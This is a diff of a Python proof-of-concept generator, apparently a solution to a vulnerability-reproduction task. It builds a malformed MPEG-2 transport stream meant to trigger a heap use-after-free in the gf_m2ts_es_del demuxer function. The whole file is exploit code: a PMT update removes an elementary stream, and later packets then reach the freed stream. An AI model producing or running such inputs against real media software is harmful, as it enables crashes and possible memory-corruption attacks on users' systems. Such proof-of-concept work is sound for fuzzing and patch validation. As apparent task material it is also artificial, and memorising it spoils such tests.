@@ -1,112 +1,115 @@
 import struct
-import binascii
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        """
-        Generate a PoC that triggers the Heap Use After Free vulnerability in gf_m2ts_es_del.
-        
-        The vulnerability likely involves a race condition or logic error where an Elementary Stream (ES)
-        is deleted via a PMT update, but subsequent packets referencing that ES ID access the freed memory.
-        
-        Structure of PoC (6 packets, 1128 bytes):
-        1. PAT: Defines Program 1 at PID 0x100.
-        2. PMT (v0): Defines Program 1 with ES at PID 0x200.
-        3. PES: Data for ES 0x200 (allocates/initializes stream).
-        4. PES: More data for ES 0x200.
-        5. PMT (v1): Updates Program 1, removing ES 0x200 (triggers gf_m2ts_es_del).
-        6. PES: Data for ES 0x200 (accesses freed stream).
-        """
-        
+        # MPEG-2 CRC32 Implementation
         def mpeg_crc32(data):
-            """Calculate MPEG-2 CRC32."""
             crc = 0xFFFFFFFF
             for byte in data:
-                crc ^= (byte << 24)
-                for _ in range(8):
-                    if crc & 0x80000000:
-                        crc = (crc << 1) ^ 0x04C11DB7
-                    else:
-                        crc = crc << 1
+                for i in range(7, -1, -1):
+                    bit = (byte >> i) & 1
+                    c15 = (crc >> 31) & 1
+                    crc <<= 1
+                    if c15 ^ bit:
+                        crc ^= 0x04C11DB7
                     crc &= 0xFFFFFFFF
             return crc
 
-        def make_packet(pid, payload, cc, pusi=False):
-            """Construct a 188-byte M2TS packet."""
-            # Header: Sync(1) Flags(2) PID/Flags(1)
-            # Sync 0x47
-            header_int = 0x47 << 24
+        # Helper to build 188-byte TS packet
+        def build_ts_packet(pid, payload, counter, pusi=0):
+            header = bytearray()
+            header.append(0x47) # Sync byte
             
-            # TEI(0), PUSI(pusi), Prio(0), PID(13)
-            flags_pid = pid & 0x1FFF
-            if pusi:
-                flags_pid |= 0x4000
-            header_int |= (flags_pid << 8)
+            # TEI(1) | PUSI(1) | Priority(1) | PID(13)
+            # 0 | pusi | 0 | pid_high
+            val = (0x40 if pusi else 0) | ((pid >> 8) & 0x1F)
+            header.append(val)
+            header.append(pid & 0xFF)
             
-            # Transport Scrambling(0), Adapt(0), CC(4)
-            # AFC = 1 (Payload only), CC = cc
-            afc_cc = 0x10 | (cc & 0x0F)
-            header_int |= afc_cc
+            # Scramble(2) | Adapt(2) | Counter(4)
+            # Adapt=01 (Payload only), Counter=counter
+            header.append(0x10 | (counter & 0x0F))
             
-            header = struct.pack('>I', header_int)
-            
-            # Payload stuffing
-            remaining = 188 - 4
-            if len(payload) < remaining:
-                # Pad with 0xFF
-                data = payload + b'\xff' * (remaining - len(payload))
-            else:
-                data = payload[:remaining]
-            
-            return header + data
+            # Stuffing with 0xFF
+            pkt = header + payload
+            if len(pkt) < 188:
+                pkt += b'\xFF' * (188 - len(pkt))
+            return pkt[:188]
 
         packets = []
 
-        # 1. PAT Packet
-        # PID 0, CC 0
-        # Program 1 -> PID 0x100
-        pat_payload = b'\x00' # Pointer field
-        # Section Header: TableID 00, Syntax 1, Len 13 (0x0D) -> 00 B0 0D
-        # Data: TSID 1 (00 01), Ver 0 CN 1 (C1), Sec 0 (00), Last 0 (00)
-        # Loop: Prog 1 (00 01), PID 0x100 (E1 00)
-        section = b'\x00\xb0\x0d\x00\x01\xc1\x00\x00\x00\x01\xe1\x00'
-        section += struct.pack('>I', mpeg_crc32(section))
-        packets.append(make_packet(0, pat_payload + section, 0, pusi=True))
+        # -----------------------------------------------------------
+        # Packet 1: PAT (Program Association Table)
+        # Defines Program 1 mapping to PID 0x100
+        # -----------------------------------------------------------
+        # TableID(0x00), SectionLen(13), ProgNum(1), Ver(0), Sec(0), Last(0), Prog(1)->PID(0x100)
+        pat_sec = bytearray([
+            0x00,                   # Table ID
+            0xB0, 0x0D,             # Section Len 13
+            0x00, 0x01,             # Prog Num 1
+            0xC1,                   # Version 0, Current
+            0x00, 0x00,             # SecNum, LastSecNum
+            0x00, 0x01,             # Program 1
+            0xE1, 0x00              # PID 0x100 (0xE000 | 0x0100)
+        ])
+        pat_sec += struct.pack('>I', mpeg_crc32(pat_sec))
+        packets.append(build_ts_packet(0, b'\x00' + pat_sec, 0, pusi=1))
 
-        # 2. PMT Packet (Version 0) - Add ES 0x200
-        # PID 0x100, CC 0
-        # Section Header: TableID 02, Syntax 1, Len 18 (0x12) -> 02 B0 12
-        # Data: Prog 1 (00 01), Ver 0 CN 1 (C1), Sec 0 (00), Last 0 (00)
-        #       PCR PID 0x1FFF (FF FF), InfoLen 0 (F0 00)
-        # Loop: Type 0x1B (AVC) (1B), PID 0x200 (E2 00), InfoLen 0 (F0 00)
-        section = b'\x02\xb0\x12\x00\x01\xc1\x00\x00\xff\xff\xf0\x00\x1b\xe2\x00\xf0\x00'
-        section += struct.pack('>I', mpeg_crc32(section))
-        packets.append(make_packet(0x100, b'\x00' + section, 0, pusi=True))
+        # -----------------------------------------------------------
+        # Packet 2: PMT (Program Map Table) Version 0
+        # PID 0x100. Defines ES PID 0x200 with Stream Type 0x11 (MPEG-4 SL)
+        # -----------------------------------------------------------
+        # TableID(0x02), SectionLen(18), Prog(1), Ver(0), Sec(0), Last(0), PCR(0x1FF), PILen(0), ES[Type 0x11, PID 0x200, InfoLen 0]
+        pmt_sec = bytearray([
+            0x02,                   # Table ID
+            0xB0, 0x12,             # Len 18
+            0x00, 0x01,             # Prog 1
+            0xC1,                   # Ver 0, Current
+            0x00, 0x00,             # SecNum, Last
+            0xE1, 0xFF,             # PCR PID 0x1FF
+            0xF0, 0x00,             # Prog Info Len 0
+            0x11,                   # Stream Type 0x11 (MPEG-4 SL-packetized)
+            0xE2, 0x00,             # ES PID 0x200
+            0xF0, 0x00              # ES Info Len 0
+        ])
+        pmt_sec += struct.pack('>I', mpeg_crc32(pmt_sec))
+        packets.append(build_ts_packet(0x100, b'\x00' + pmt_sec, 0, pusi=1))
 
-        # 3. PES Data (PID 0x200) - Stream Content
-        # CC 0
-        # PES Header: Prefix 00 00 01, StreamID E0 (Video), Len 00 00
-        pes_payload = b'\x00\x00\x01\xe0\x00\x00' + b'\xAA' * 100
-        packets.append(make_packet(0x200, pes_payload, 0, pusi=True))
+        # -----------------------------------------------------------
+        # Packet 3: ES Data
+        # PID 0x200. Start of PES packet.
+        # This initializes the stream context in the demuxer.
+        # -----------------------------------------------------------
+        # PES Header: StartCode(000001E0), Len(0), Flags(80..), HeaderLen(0)
+        es_payload = b'\x00\x00\x01\xE0\x00\x00\x80\x00\x00' + b'\xAA'*50
+        packets.append(build_ts_packet(0x200, es_payload, 0, pusi=1))
 
-        # 4. PES Data (PID 0x200) - Continuation
-        # CC 1
-        packets.append(make_packet(0x200, b'\xBB'*184, 1, pusi=False))
+        # -----------------------------------------------------------
+        # Packet 4: PMT Version 1 (Update)
+        # PID 0x100. Updates Program 1.
+        # CRITICALLY: Removes ES PID 0x200 (Empty ES loop).
+        # This triggers `gf_m2ts_es_del` for the active stream.
+        # -----------------------------------------------------------
+        # TableID(0x02), SectionLen(13), Prog(1), Ver(1), Sec(0), Last(0), PCR(0x1FF), PILen(0)
+        pmt2_sec = bytearray([
+            0x02,                   # Table ID
+            0xB0, 0x0D,             # Len 13
+            0x00, 0x01,             # Prog 1
+            0xC3,                   # Ver 1 (bits 00001), Current
+            0x00, 0x00,             # SecNum, Last
+            0xE1, 0xFF,             # PCR PID 0x1FF
+            0xF0, 0x00              # Prog Info Len 0
+        ])
+        pmt2_sec += struct.pack('>I', mpeg_crc32(pmt2_sec))
+        packets.append(build_ts_packet(0x100, b'\x00' + pmt2_sec, 1, pusi=1))
 
-        # 5. PMT Packet (Version 1) - Remove ES 0x200
-        # PID 0x100, CC 1
-        # Section Header: TableID 02, Len 13 (0x0D) -> 02 B0 0D
-        # Data: Prog 1 (00 01), Ver 1 CN 1 (C3), Sec 0 (00), Last 0 (00)
-        #       PCR PID 0x1FFF (FF FF), InfoLen 0 (F0 00)
-        # Loop: Empty (Stream 0x200 removed)
-        section = b'\x02\xb0\x0d\x00\x01\xc3\x00\x00\xff\xff\xf0\x00'
-        section += struct.pack('>I', mpeg_crc32(section))
-        packets.append(make_packet(0x100, b'\x00' + section, 1, pusi=True))
-
-        # 6. PES Data (PID 0x200) - Trigger UAF
-        # CC 2
-        # This packet arrives for PID 0x200 which was just removed from the PMT.
-        # If internal structures for 0x200 were freed but referenced in the demuxer loop, this crashes.
-        packets.append(make_packet(0x200, b'\xCC'*184, 2, pusi=False))
+        # -----------------------------------------------------------
+        # Packet 5 & 6: Data on freed PID
+        # PID 0x200.
+        # Sending data on the PID that was just freed in the previous packet.
+        # If the demuxer holds a dangling reference (Use-After-Free), this crashes.
+        # -----------------------------------------------------------
+        packets.append(build_ts_packet(0x200, b'\xBB'*100, 1, pusi=0))
+        packets.append(build_ts_packet(0x200, b'\xCC'*100, 2, pusi=0))
 
         return b''.join(packets)
